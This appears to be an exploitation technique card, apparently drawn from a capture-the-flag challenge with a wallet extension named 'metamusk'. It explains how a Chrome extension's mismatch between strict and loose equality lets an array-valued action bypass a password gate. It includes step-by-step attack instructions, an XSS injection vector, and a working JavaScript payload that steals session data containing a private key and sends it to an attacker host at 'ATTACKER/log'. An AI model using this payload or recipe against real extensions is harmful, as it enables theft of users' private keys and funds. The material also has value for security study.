---
name: chrome_extension_strict_loose_comparison_bypass
vuln_type: auth_bypass
sub_technique: type_coercion_bypass
category: exploitation
safety_level: safe
---

# Chrome Extension Content Script === Vs Background.Js == Comparison Bypass Via Array Action Parameter

## When to Apply

A Chrome extension uses a content_script as a message relay between web pages (via `window.postMessage`) and the background service worker (via `chrome.runtime.sendMessage`). The content_script checks `event.data.action === 'sensitiveAction'` using strict equality to route sensitive actions through password-gated handlers. The background.js checks `request.action == 'sensitiveAction'` using loose equality to dispatch actions. In JavaScript, `['sensitiveAction'] === 'sensitiveAction'` is `false`, but `['sensitiveAction'] == 'sensitiveAction'` is `true` (array-to-string coercion). By sending the action as a single-element array, the attacker bypasses the content_script's strict check (skipping password verification) while still matching the background.js loose check, gaining access to sensitive extension APIs without credentials.

## Prerequisites

- Chrome extension with content_script message relay architecture
- content_script uses === (strict equality) for action routing to password-gated handlers
- background.js uses == (loose equality) for action dispatching
- Fallback path in content_script forwards unrecognized actions to background.js via chrome.runtime.sendMessage
- Sensitive action (getSessionData, sendTransaction, etc.) returns private data when called from background.js
- XSS or attacker-controlled page in same origin can call window.postMessage to content_script

## Steps

1. Find XSS vector in dapp page (e.g., `from` param in tracking-events.html rendered via innerHTML)\n2. Trigger bot to visit dapp URL with XSS payload:\n   `http://dapp:PORT/?tab=tracking&from=<img src=x onerror='PAYLOAD' />`\n3. Bot's extension sets password and calls `unlockWithPassword` → active session with funds\n4. XSS payload sends message with action as array:\n   `window.metamuskExtension.sendMessage({action: ['getSessionData']})`\n5. content_script check: `event.data.action === 'getSessionData'` → false (array !== string)\n   → skips password-gated handleGetSessionData\n   → falls through to generic `chrome.runtime.sendMessage(event.data, ...)` forwarding\n6. background.js check: `request.action == 'getSessionData'` → true (array == string coercion)\n   → calls handleGetSessionData → returns sessionData with privateKey, rpcEndpoint, etc.\n7. XSS exfiltrates sessionData to attacker server\n8. Attacker uses stolen privateKey to perform blockchain transactions (deposit to Vault)

## Code Template

```
# XSS payload (URL-encoded in 'from' parameter):\n# <img src=x onerror='PAYLOAD' />\n# where PAYLOAD is:\n(async function(){\n  await new Promise(r=>setTimeout(r,3000));\n  let out = await window.metamuskExtension.sendMessage({\n    action: ['getSessionData']  // array bypasses === in content_script\n  });\n  let { sessionData } = out;\n  fetch(`http://ATTACKER/log?message=${\n    encodeURIComponent(JSON.stringify(sessionData))\n  }`, {method:'GET', mode:'no-cors'});\n})()
```

## Examples

### Example 1

- **content_script_check**: event.data.action === 'getSessionData' (strict, returns false for array)
- **background_check**: request.action == 'getSessionData' (loose, returns true for array)
- **js_coercion**: ['getSessionData'] == 'getSessionData' is true (Array.toString() → 'getSessionData')
- **xss_vector**: tracking-events.html innerHTML renders URL 'from' parameter unsanitized
- **sensitive_data**: sessionData contains: privateKey, rpcEndpoint, playerAddress, challengeContract, uuid
- **bot_url_filter**: re.match(r'^http:\/\/metamusk-[a-z]+:[0-9]{4,5}\/.*$', dapp_url)

This technique exploits a subtle JavaScript type coercion difference between strict (===) and loose (==) equality operators in a Chrome extension's message passing architecture. The content_script acts as a security gate, requiring password verification for sensitive actions using strict comparison. The background service worker uses loose comparison for the same action dispatch. A single-element array ['action'] passes through the gate because strict comparison with a string returns false, but matches the background's loose comparison because JavaScript's Array.prototype.toString() converts ['action'] to 'action'. The attack requires an XSS vector to inject code that calls the extension's messaging API, and a bot that has an authenticated session with the extension.
